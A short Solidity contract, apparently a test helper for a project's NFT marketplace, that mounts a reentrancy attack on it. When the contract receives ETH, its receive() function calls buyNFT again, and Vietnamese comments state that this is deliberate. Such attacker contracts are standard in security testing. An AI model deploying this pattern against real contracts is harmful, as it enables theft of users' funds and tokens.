// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./Marketplace.sol";

contract ReentrantBuyer {
    Marketplace public marketplace;
    address public nft;
    uint256 public tokenId;
    bool public attacked;

    constructor(address _marketplace, address _nft, uint256 _tokenId) {
        marketplace = Marketplace(_marketplace);
        nft = _nft;
        tokenId = _tokenId;
        attacked = false;
    }

    // Gọi để tấn công
    function attack() external payable {
        attacked = true;
        marketplace.buyNFT{value: msg.value}(nft, tokenId);
    }

    // Khi contract nhận ETH, sẽ cố tình gọi lại buyNFT để gây reentrancy
    receive() external payable {
        if (attacked) {
            marketplace.buyNFT(nft, tokenId); // Reentrant call
        }
    }
}
